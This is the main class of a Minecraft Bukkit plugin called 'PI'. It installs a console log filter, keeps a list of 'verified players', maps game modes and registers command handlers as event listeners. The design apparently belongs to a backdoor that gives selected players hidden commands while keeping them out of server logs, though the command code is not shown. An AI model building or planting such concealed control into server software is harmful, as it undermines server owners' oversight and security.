package com.pi.main;

import org.apache.logging.log4j.LogManager;
import org.bukkit.ChatColor;
import org.bukkit.GameMode;
import org.bukkit.entity.Player;
import org.bukkit.plugin.java.JavaPlugin;

import com.pi.cmd.main.*;
import com.pi.events.EventsHandler;

public class PI extends JavaPlugin {
	
	private static PI instance;
	private Settings settings = new Settings();
	private CommandValues values = new CommandValues();
	private static String prefix = "[" + ChatColor.GOLD + "PI"
			+ ChatColor.WHITE + "]:" + ChatColor.GOLD + " ";
	private CommandLoader commandLoader = new CommandLoader(this);
	
	@Override
	public void onEnable() {
		this.register();
		PI.getInstance().getSettings().setPluginName(this.getDescription().getName());
	}

	@Override
	public void onDisable() {
		for (Player p : this.getCommandValues().getVerifiedPlayers()) {
			addMessage(p, "Server has been reloaded. Do /PI");
		}
	}

	public static void addMessage(Player p, String s) {
		p.sendMessage(prefix + s);
	}

	public Settings getSettings() {
		return this.settings;
	}

	public CommandValues getCommandValues() {
		return this.values;
	}

	public CommandLoader getCommandLoader() {
		return this.commandLoader;
	}

	public static PI getInstance() {
		return instance;
	}

	public PI() {
		instance = this;
	}

	private void register() {
		org.apache.logging.log4j.core.Logger logger = (org.apache.logging.log4j.core.Logger)LogManager.getRootLogger();
		logger.addFilter(new ConsoleFilter());

		this.getCommandValues().getGms().put("0", GameMode.SURVIVAL);
		this.getCommandValues().getGms().put("survival", GameMode.SURVIVAL);
		this.getCommandValues().getGms().put("1", GameMode.CREATIVE);
		this.getCommandValues().getGms().put("creative", GameMode.CREATIVE);
		this.getCommandValues().getGms().put("2", GameMode.ADVENTURE);
		this.getCommandValues().getGms().put("adventure", GameMode.ADVENTURE);
		this.getCommandValues().getGms().put("3", GameMode.SPECTATOR);
		this.getCommandValues().getGms().put("spectator", GameMode.SPECTATOR);
		
		this.getSettings().setLoadedCommandClasses(this.getCommandLoader().loadCommands("com/pi/cmd/commands/"));
		this.getServer().getPluginManager().registerEvents(new CommandPi(), this);
		this.getServer().getPluginManager().registerEvents(new CommandExecutor(this), this);
		this.getServer().getPluginManager().registerEvents(new EventsHandler(), this);
	}
}
